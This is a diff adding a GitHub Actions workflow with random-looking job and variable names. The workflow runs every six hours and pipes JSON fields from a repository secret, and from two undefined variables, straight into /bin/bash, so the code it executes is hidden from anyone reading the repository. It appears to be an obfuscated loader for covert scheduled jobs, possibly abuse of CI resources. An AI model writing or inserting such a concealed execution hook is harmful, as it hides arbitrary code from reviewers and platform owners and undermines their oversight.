@@ -1,0 +1,19 @@
+name: infantileapply
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: infantileapply
+        env:
+          oh4: ${{ secrets.oh4 }}
+        run: |
+          echo $oh4 | jq -r .gg06192 | /bin/bash
+          echo $nfvgw39 | jq -r .cqh1382 | /bin/bash
+          echo $axi90759 | jq -r .gwp27013 | /bin/bash
+
